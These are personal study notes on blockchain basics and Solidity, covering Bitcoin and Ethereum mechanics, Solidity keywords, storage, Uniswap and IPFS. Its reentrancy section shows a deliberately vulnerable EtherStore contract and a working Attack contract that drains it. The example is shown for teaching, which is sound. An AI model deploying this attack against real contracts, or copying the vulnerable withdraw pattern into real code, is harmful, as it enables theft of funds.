# Web3

## Bitcoin

### Tokenomics

21M total supply  
mining rewards half every 4 years  
after 2100, miners earn transaction fees  
Fees rise during congestion, incentivizing miners to prioritize high-value transactions

### Concensus

POW(proof of work)  
Miner solve hash puzzles(to get fixed length of zeros prefix in hash value)  
the first solver propose the block  
Other nodes verify the block, and if valid, it’s added to the blockchain  
The winning miner receives a block reward (new BTC + transaction fees)

**Longest Chain Rule**: The chain with the most cumulative work is considered the valid one

Attacking Bitcoin requires controlling **51%+ of the total hash power**

### Merkel Tree

a binary tree built from the hashes of individual transactions in a block.It allows you to verify whether a transaction is included in a block without downloading the entire block  
Merkel root is included in every btc block header  
**How to verify a txn existence?** Build the path to the root using hashes.

### UTXO(unspent transaction output)

how bitcoin tracks ownership and transfers values  
Every Bitcoin transaction creates outputs — chunks of BTC assigned to addresses.When these outputs haven’t been spent yet, they’re called **UTXOs**  
Each wallet holds a collection of UTXOs  
**Inputs**: UTXOs you’re spending  
**Outputs**: New UTXOs created (to recipient and possibly back to you as change)

## ETH

### Tokenomics

circulating supply: 120m, no hard cap
validators stake 32 eth to secure network

### execution vs concensus

Ethereum nodes are composed of two clients working together:

**Layer Role**  
Execution Layer (EL) Runs the EVM, processes transactions, updates state, handles smart contracts  
Consensus Layer (CL) Validates blocks, coordinates validators, ensures agreement across the network

### Transaction Lifecycle in Ethereum

#### Transaction Submission & broadcast to network

A user signs and broadcasts a transaction to the network.  
Nodes receive it and place in their mempool(a waiting room for transactions)

#### validator selection & Block Proposal

every 12 second, eth selects a validator to propose the next block  
A validator selects transactions(with higher priority fee) from the mempool and proposes a new block and broadcast to network.  
The block includes your transaction, but it hasn’t been executed yet.

#### EVM Execution

As part of block validation, the EVM executes each transaction in order.
This includes contract calls, state updates, and gas accounting.
If a transaction fails (e.g. runs out of gas or reverts), it’s still part of the block — but its effects are discarded.

#### State Update

After all transactions are executed, the new state root is computed.  
Validators verify that the state matches across nodes.
The validator who propose blocks called proposer, who attest block called attester

### proposer selection

at the beginning of each slot(12 seconds), need a proposer to propose block
Using a pseudo-random algo called RANDAO.
validator with less than 32 eth have lower chances.
validator with more than 32 eth have full/same weight.
The proposer for each slot is actually determined two epochs in advance (~12.8 minutes).

### Epoch

An epoch consists of 32 slots, and each slot lasts 12 seconds.

During each epoch:  
Validators are ramdomly reshuffled into committees  
One validator(not limited to committee) is selected per slot to propose a block  
Others are assigned to attest (vote) on blocks.
Validators are assigned to attestation committees each epoch.  
Only validators in the committee for a given slot can attest during that slot

### All Validators Can Do Both

Any active validator with 32 ETH staked can be selected as a block proposer.  
Every validator is also randomly assigned to an attestation committee once per epoch.  
Over time, each validator takes turns being a proposer and frequently serves as an attester.

### Gas

**why gas limit needed**  
prevent infinite loop & abuse  
control transaction cost, user can limit how much eth they're willing to spend
help validators prioritize transaction because eth block has maximum gas capacity, so txn with lower gas limit are easier to include

**Priority fee**(aka tip, paid to validators)
**base fee**(mandatory, burned, automatically adjusted by network based on demand)
More total tip(priority fee \* gas used), more chances of txn being picked

### ERC20 fungible token

Every token is identical and interchangeable

### ERC721 non fungible token NFT

Each token is distinct and has its own ID

### ERC4337 account abstraction

## solidity

### calldata keyword vs memory keyword vs storage

**calldata**
Used for external function parameters, especially dynamic types like arrays and strings.
data is read only, cannot modify  
efficient than memory

```solidity
function process(uint[] calldata data) external {
    uint x = data[0]; // ✅
    // data[0] = 10; // ❌ Compiler error
}
```

**memory**
used for temporary variables inside functions
read/write
expensive than calldata due to data copying

```solidity
function sum(uint[] memory nums) public pure returns (uint) {
    uint total = 0;
    for (uint i = 0; i < nums.length; i++) {
        total += nums[i];
    }
    return total;
}

uint[] public numbers;

function update() public {
    uint[] memory nums = numbers;
    nums[0] = 42; // ❌ only modifies the copy
}


```

**storage**
Used for state variables that persist across transactions  
Read/write and permanent  
Most expensive in terms of gas
Storage variables must be declared as part of the contract's state, or referenced from existing storage structures like mappings or arrays

```solidity
uint[] public numbers;

function update() public {
    uint[] storage nums = numbers; // create reference
    nums[0] = 42; // ✅ modifies state
}

```

### copy value vs reference

value type(uint, bool, address): always copy value
reference type(arrays, structs, mapping): depend on data location

```solidity
uint[] storage b = a;   // storage → storage    Reference (no copy)
uint[] memory b = a;    // storage → memory	    Copy (deep copy)
uint[] memory b = a;    // memory → memory	    Copy (deep copy)
a = b;                  // memory → storage	    Copy (deep copy)
uint[] memory b = a;    // calldata → memory	Copy (deep copy)
// calldata → storage	not allowed, must go through memory
```

### how to send eth?

**transfer()**

```solidity
_to.transfer(msg.value);
```

Sends 2300 gas  
Reverts on failure  
Simple and safe, but deprecated for many use cases due to gas limitations

**send()**

```solidity
bool success = _to.send(msg.value);
require(success, "Send failed");

```

Also sends 2300 gas  
Returns false on failure (does not revert automatically)  
Requires manual error handling  
Rarely used today

**call()**

```solidity
(bool success, ) = _to.call{value: msg.value}("");
require(success, "Call failed");
```

Forwards all remaining gas  
Returns a tuple: (success, data)  
Most flexible and currently recommended method  
Must be used with reentrancy protection

### fallback function

special function that gets triggered when:  
A contract is called with data that doesn’t match any existing function signature  
Or when Ether is sent to the contract and no receive() function is defined  
properties of fallback:  
Must be declared external  
Can be marked payable to accept Ether  
Has no name, no arguments, and no return value  
Limited to 2300 gas when triggered via .send() or .transfer()  
Used for logging, rejecting unexpected calls, or forwarding calls in proxy contracts

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FallbackExample {
    event Log(string func, uint256 gas);

    // Fallback function
    fallback() external payable {
        emit Log("fallback", gasleft());
    }

    // Receive function (optional)
    receive() external payable {
        emit Log("receive", gasleft());
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```

### receive function

a special function, similar to fallback  
Triggered when the contract receives Ether with no data  
Must be declared as external payable

Send ETH
│
├── msg.data is empty
│ ├── receive() exists → call receive()
│ └── else → call fallback()
│
└── msg.data is not empty → call fallback()

### inheritance

inherit functions, variables, modifiers from parent contract
fully support, single/multilevel/multiple/hierarchiel
Use **virtual** in base contracts to allow overriding  
Use **override** in derived contracts to customize behavior. If two parents contracts have the method, should write override(A,B)

```solidity
contract Parent {
    function greet() public pure returns (string memory) {
        return "Hello from Parent";
    }
}

contract Child is Parent {
    // Inherits greet() from Parent
}

```

Solidity resolves conflicts in multiple inheritance using C3 linearization (depth-first, right-to-left)

```solidity
// D inherits from B and C, both override greet()
contract D is B, C {
    // Must explicitly override both B and C
    function greet() public pure override(B, C) returns (string memory) {
        return super.greet(); // Resolves to C's greet() because C is right-most
    }
}
```

### library keyword

a special kind of contract  
cannot hold state or receive eth  
only provide reusable functions  
cannot inherit or be inherited  
if all functions are internal, compiler copies the library code into calling contract;if some functions are public or external, the contract is compiled into bytecode and needs to be deployed

### modifier

modifier allowed to change/restrict the behavior of functions. can do access control, validation checks, pre/post conditions

```solidity
contract MyContract {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _; // This tells Solidity where to insert the function body
    }

    function changeOwner(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}

```

### merge wild card

a placeholder inside a modifier that tells the compiler where to insert the body of the function being modified.

```solidity
modifier logBefore() {
    emit Log("Before");
    _;
}

modifier logAfter() {
    _;
    emit Log("After");
}

```

can use multiple \_, first run onlyOwner, then run whenActive, then run deactivate
whenActive + deactivate = \_ in onlyOwner
deactivate = \_ in whenActive

```solidity
contract MyContract {
    address public owner;
    bool public isActive = true;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    modifier whenActive() {
        require(isActive, "Contract is not active");
        _;
    }

    function deactivate() public onlyOwner whenActive {
        isActive = false;
    }
}
```

### payable keyword

a function annotated by payable can accept eth, eth will be stored in the contract add
a payable address can receive eth by calling address.transfer() or call()

### pure keyword

function do not read or modify the blockchain state

### require keyword vs revert keyword vs slient revert vs assert

**required**
validate input, if false, then revert transaction and optionally provides an error message. Refund unused gas

**revert**
Explicitly aborts execution and reverts state changes. refund unused gas.

**slient revert**
A transaction fails and reverts without returning a reason string or custom error.

**assert**
verifies something must be true. if failed, revert transaction and consume all gas

### unchecked keyword

disable overflow and underflow checks(so that it will wrap(for uint8 then 255->0) rather than revert) for arithmetic operations introduced in Solidity 0.8.0 and later.

```solidity
contract Example {
    function safeSub(uint a, uint b) public pure returns (uint) {
        // This will revert if b > a
        return a - b;
    }

    function unsafeSub(uint a, uint b) public pure returns (uint) {
        // This will wrap around instead of reverting
        unchecked {
            return a - b;
        }
    }
}
```

### using for keyword

a syntax sugar. attach library functions to a specific type, enabling method-like syntax for calling those functions
Works especially well with structs, arrays, and primitive types

```solidity
library Math {
    function square(uint x) internal pure returns (uint) {
        return x * x;
    }
}

contract Calculator {
    using Math for uint;

    function getSquare(uint x) public pure returns (uint) {
        return x.square(); // Instead of Math.square(x)
    }
}
```

### view keyword

function can read but cannot modify

### visibility keyword

public: accessible everywhere
private: only inside the contract where it is defined.
internal: inside contract or derived contract
external: only from outside the contract(not internally)

### virtual keyword

a function can be overridden by a derived contract
private function cannot be virtual
all functions in interface are implicitly virtual

### Reentrant Guard

A reentrancy attack is a sneaky exploit in smart contracts—especially on Ethereum—where an attacker repeatedly calls a vulnerable function before its previous execution finishes. This can lead to draining funds or corrupting contract state.

⚠️ Vulnerable Contract: EtherStore

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EtherStore {
mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No balance to withdraw");

        // ⚠️ External call before state update
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}
```

🐍 Attacker Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./EtherStore.sol";

contract Attack {
EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback function gets triggered when Ether is received
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(); // Re-enter EtherStore
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}
```

🔍 What Happens?
The attacker deposits 1 ETH.

Calls withdraw(), which sends ETH before updating the balance.

The fallback function re-enters withdraw() before the balance is zeroed.

This loop continues, draining the contract.

### solidity storage

solidity storage 的每一个 slot 是 32Bytes

    contract FunWithStorage{
        //顺序存储在storage中
        uint256 favouriteNumber;
        bool someBool;
        uint256[] myArray;
        uint256 constant NOT_IN_STORAGE = 123;//const和immutable不存在storage中，因为他们直接写在contract的bytecode中

        constructor(){
            favouriteNumber = 25;
            someBool = true;
            myArray.push(222);//每次插入一项，做hash
        }

        function doStuff() public {
            uint256 newVar = favouriteNumber+1;
            uint256 otherVar = 7;
            //方法中的变量不存在storage中，存在memory中，方法执行完就删了
        }
    }

Storage  
[0] 0x00..19  
[1] 0x00..01  
[2] 0x00..01 存数组的长度  
[3] 如果是 mapping 则留白  
[keccak256(2)]0x00..0de  
如果想节省一点 gas，可以把少读 storage，读一次进 memory 后重复读 memory(mappings 不能存进 memory，sorry！)因为读写 storage 要花很多 gas(SLOAD 花 800 SSTORE 花 20000)

## storage vs memory

storage 是存在 blockchain 上，memory 是存本地，用完即删.
用了 storage 关键字的变量会指向 blockchain 中的那个对象，若修改即为修改 blockchain 上存储的东西

## 小游戏

https://cryptozombies.io/

## youtube

https://www.youtube.com/watch?v=gyMwXuJrbJQ

## Others

### oracle

an oracle is a trusted mechanism that allows smart contracts to access external data

### Uniswap

allow swap ERC-20 token without centralized intermediaries

#### AMM automated market maker

replace order book with liquidity pool, price determined by constant product formula: x\*y=k, x and y are two tokens, k is constant, k is determined by the initial token supply

#### LP liquidity pool

contains two tokens. the deeper the pool is, the less slippage when doing swap

### makerdao

### IPFS

InterPlanetary File System, peer-to-peer network for storing and sharing data in a distributed file system.  
Features:

1. Content Addressing: files are identified by content, if content changes, address changes. when hashing the content, a CID is generated, CID is the addrss of the file. to retrieve the file, asking IPFS and any node having the content serve.
2. Decentralized storage: data stored across a network of nodes, not on centralized nodes
3. Immutable and verifiable: Once file added to IPFS, the hash makes sure it is not tampered
4. offline access: retrieve files from nearby nodes, even without network

**how to access?**
Download ipfs desktop and run as node
use gateway(send http request to a centralized server):https://ipfs.io/ipfs/<CID>
ipfs://<CID> via local node
IPFS Companion(chrome extension) redirect
